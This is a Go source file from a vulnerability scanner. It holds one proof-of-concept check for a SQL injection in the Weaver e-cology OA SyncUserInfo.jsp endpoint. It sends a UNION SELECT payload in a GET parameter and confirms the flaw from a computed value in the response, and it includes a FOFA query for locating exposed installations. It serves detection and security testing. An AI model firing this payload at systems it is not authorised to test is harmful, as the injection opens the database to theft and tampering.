package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

// fofa-query: app="泛微-协同办公OA"
//description: Syncuserinfo包含一个通过GET请求的SQL注入漏洞。攻击者可能从数据库获取敏感信息，修改数据.
//reference: https://github.com/chaitin/xray/blob/master/pocs/ecology-syncuserinfo-sqli.yml

func E_Cology_syncuserinof_sql(u string) bool {
	if req, err := pkg.HttpRequset(u+"/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "4386499557") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln weaver syncuserinof_sql|%s\n", u+"/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null"))

			return true
		}
	}
	return false
}
